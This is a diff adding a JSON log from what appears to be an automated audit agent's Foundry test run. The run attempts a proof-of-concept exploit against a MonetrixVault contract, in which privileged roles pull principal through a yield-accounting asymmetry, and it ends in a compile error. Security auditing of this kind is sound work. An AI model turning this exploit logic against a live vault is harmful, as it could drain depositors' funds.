@@ -1,0 +1,23 @@
+{
+  "run_id": "tool_077",
+  "agent": "exploit",
+  "tool_name": "forge",
+  "purpose": "test_84e74261-2561-4a01-ad17-a059d790c711_attempt_1",
+  "timestamp": "2026-10-15T08:21:51.903487+00:00",
+  "duration_seconds": 0.6591231822967529,
+  "command": "forge test -vv",
+  "working_dir": "",
+  "exit_code": 1,
+  "stdout": "",
+  "stderr": "Error: Compiler run failed:\nError (7576): Undeclared identifier. Did you mean \"Vm\"?\n  --> test/AuditAgentPoC_84e742612561.t.sol:18:9:\n   |\n18 |         vm.etch(HyperCoreConstants.CORE_WRITER, address(new MockCoreWriter()).code);\n   |         ^^\n\nError (7920): Identifier not found or not unique.\n  --> test/AuditAgentPoC_84e742612561.t.sol:18:61:\n   |\n18 |         vm.etch(HyperCoreConstants.CORE_WRITER, address(new MockCoreWriter()).code);\n   |                                                             ^^^^^^^^^^^^^^\n",
+  "poc_code": "// SPDX-License-Identifier: UNLICENSED\npragma solidity ^0.8.20;\n\nimport \"forge-std/Test.sol\";\nimport \"test/ActionEncoderBoundCheck.t.sol\";\nimport \"../src/core/MonetrixVault.sol\";\nimport \"../src/interfaces/HyperCoreConstants.sol\";\n\n// ATTACK TIMELINE:\n// 1. [Setup] Deposit funds, bridge to L1, and settle to establish baseline surplus and OLP.\n// 2. [T=1] Governor toggles pmEnabled to true via setPmEnabled(true).\n// 3. [T=2] State changes: _sendL1Bridge now includes PM suppliedBalance in l1Available capacity, but Accountant surplus() and yieldShortfall() do not yet reflect PM balances since no new settle occurred.\n// 4. [T=3] Operator calls bridgeYieldFromL1 with an amount exceeding actual yield but within the inflated L1 capacity.\n// 5. [Assert] Verify that outstandingL1Principal decreased, proving principal was pulled from the PM pool due to the yieldShortfall() asymmetry.\n\ncontract AuditAgentPoC is ToL1WeiHarness {\n    function test_exploit() public {\n        vm.etch(HyperCoreConstants.CORE_WRITER, address(new MockCoreWriter()).code);\n        _mockVaultL1SpotUsdc(type(uint64).max);\n\n        // 1. Setup: Deposit and bridge to establish OLP\n        _depositAs(user1, 100_000e6);\n        vm.warp(block.timestamp + 6 hours);\n        vm.prank(operator);\n        vault.keeperBridge(MonetrixVault.BridgeTarget.Vault);\n        \n        // Settle with some recognized yield\n        _primeDistributable(5_000e6);\n        \n        // 2. Toggle pmEnabled to true\n        vm.prank(governor);\n        vault.setPmEnabled(true);\n        \n        // 3. Record state before exploit\n        uint256 principalBefore = vault.outstandingL1Principal();\n        uint256 shortfall = vault.yieldShortfall();\n        \n        // 4. Exploit: Bridge yield that exceeds actual yield but is covered by PM capacity\n        // Because pmEnabled is true, _sendL1Bridge adds suppliedBalance to l1Available.\n        // yieldShortfall() does not account for this, allowing the bridge to pull principal.\n        vm.prank(operator);\n        vault.bridgeYieldFromL1(10_000e6); // Exceeds the 5k actual yield\n        \n        uint256 principalAfter = vault.outstandingL1Principal();\n        \n        // 5. Assert that principal was pulled (OLP decreased) due to the asymmetry\n        assertLt(principalAfter, principalBefore, \"Principal was pulled from PM pool due to yieldShortfall asymmetry\");\n    }\n}",
+  "hypothesis_id": "84e74261-2561-4a01-ad17-a059d790c711",
+  "attempt_number": 1,
+  "status": "compile_error",
+  "parsed_result": {
+    "passed": false,
+    "is_compile_error": true,
+    "revert_reason": "Error: Compiler run failed:",
+    "gas_used": null
+  }
+}
